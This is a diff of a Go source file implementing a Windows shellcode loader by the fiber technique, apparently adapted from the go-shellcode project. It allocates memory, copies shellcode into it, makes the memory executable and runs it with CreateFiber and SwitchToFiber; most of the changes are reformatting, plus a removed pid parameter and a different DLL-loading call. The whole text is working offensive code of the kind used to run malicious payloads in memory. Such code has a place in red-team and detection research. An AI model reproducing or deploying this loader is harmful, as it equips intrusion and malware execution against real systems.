@@ -9,9 +9,9 @@ https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/CreateFiber/main.go
 */
 
 import (
+  "fmt"
   "unsafe"
   "errors"
-  "fmt"
 
   "golang.org/x/sys/windows"
 )
@@ -30,10 +30,10 @@ const (
   PAGE_READWRITE = 0x04
 )
 
-func Fibers(shellcode []byte, pid int) (error) {
+func Fibers(shellcode []byte) (error) {
 
-  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-  ntdll := windows.NewLazySystemDLL("ntdll.dll")
+  kernel32 := windows.NewLazyDLL("kernel32.dll")
+  ntdll := windows.NewLazyDLL("ntdll.dll")
 
   VirtualAlloc := kernel32.NewProc("VirtualAlloc")
   VirtualProtect := kernel32.NewProc("VirtualProtect")
@@ -45,21 +45,39 @@ func Fibers(shellcode []byte, pid int) (error) {
   fiberAddr, _, _ := ConvertThreadToFiber.Call() // Convert thread to fiber
 
   // Allocate shellcode
-  addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+  addr, _, _ := VirtualAlloc.Call(
+    0,
+    uintptr(len(shellcode)),
+    MEM_COMMIT|MEM_RESERVE,
+    PAGE_READWRITE,
+  )
 
-  if addr == 0 {
+  if (addr == 0) {
     return errors.New("VirtualAlloc failed and returned 0")
   }
 
   // Copy shellcode to memory
-  RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+  RtlCopyMemory.Call(
+    addr,
+    (uintptr)(unsafe.Pointer(&shellcode[0])),
+    uintptr(len(shellcode)),
+  )
 
   oldProtect := PAGE_READWRITE
   // Change memory region to PAGE_EXECUTE_READ
-  VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+  VirtualProtect.Call(
+    addr,
+    uintptr(len(shellcode)),
+    PAGE_EXECUTE_READ,
+    uintptr(unsafe.Pointer(&oldProtect)),
+  )
 
   // Create fiber
-  fiber, _, _ := CreateFiber.Call(0, addr, 0)
+  fiber, _, _ := CreateFiber.Call(
+    0,
+    addr,
+    0,
+  )
 
   _, _, errSwitchToFiber := SwitchToFiber.Call(fiber)
   if errSwitchToFiber != nil {
